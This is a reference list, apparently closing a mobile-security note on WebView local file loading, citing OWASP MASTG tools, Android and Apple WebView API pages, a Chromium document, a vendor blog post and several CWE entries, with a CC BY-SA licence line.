- OWASP MASTG tools: [semgrep (MASTG-TOOL-0110)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/), [rabin2 (MASTG-TOOL-0129)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0129/), [Frida for Android (MASTG-TOOL-0001)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0001/), [Frida for iOS (MASTG-TOOL-0039)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0039/), [radare2 for iOS (MASTG-TOOL-0073)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/), [jadx (MASTG-TOOL-0018)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0018/) (CC BY-SA 4.0)
- Android Developers: [`WebSettings`](https://developer.android.com/reference/android/webkit/WebSettings), [Load in-app content](https://developer.android.com/develop/ui/views/layout/webapps/load-local-content), [WebView unsafe file inclusion](https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion), [`WebViewAssetLoader`](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader), [`WebViewAssetLoader.InternalStoragePathHandler`](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader.InternalStoragePathHandler), [`<application>` element (`usesCleartextTraffic` and WebView)](https://developer.android.com/guide/topics/manifest/application-element), [Native bridges](https://developer.android.com/privacy-and-security/risks/insecure-webview-native-bridges), [Custom Tabs](https://developer.chrome.com/docs/android/custom-tabs/overview/), [Trusted Web Activities](https://developer.android.com/develop/ui/views/layout/webapps/trusted-web-activities)
- Chromium: [CORS and WebView API](https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/cors-and-webview-api.md)
- Apple: [`WKWebView`](https://developer.apple.com/documentation/webkit/wkwebview), [`loadFileURL(_:allowingReadAccessTo:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadfileurl%28_:allowingreadaccessto:%29), [`loadFileRequest(_:allowingReadAccessTo:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadfilerequest%28_:allowingreadaccessto:%29), [`loadHTMLString(_:baseURL:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadhtmlstring%28_:baseurl:%29), [`WKPreferences`](https://developer.apple.com/documentation/webkit/wkpreferences), [`WKWebpagePreferences.allowsContentJavaScript`](https://developer.apple.com/documentation/webkit/wkwebpagepreferences/allowscontentjavascript), [`WKURLSchemeHandler`](https://developer.apple.com/documentation/webkit/wkurlschemehandler), [`SFSafariViewController`](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller), [Key-Value Coding Programming Guide: accessor search patterns](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/KeyValueCoding/SearchImplementation.html); WebKit blog: [App-Bound Domains](https://webkit.org/blog/10882/app-bound-domains/)
- Oversecured: [Exploring vulnerabilities in WebResourceResponse](https://oversecured.com/blog/android-exploring-vulnerabilities-in-webresourceresponse)
- CWE: [CWE-22](https://cwe.mitre.org/data/definitions/22.html), [CWE-79](https://cwe.mitre.org/data/definitions/79.html), [CWE-200](https://cwe.mitre.org/data/definitions/200.html), [CWE-669](https://cwe.mitre.org/data/definitions/669.html)

> Adapted and extended from the OWASP MASWE and MASTG (https://mas.owasp.org), licensed under CC BY-SA 4.0. This note is distributed under the same licence.
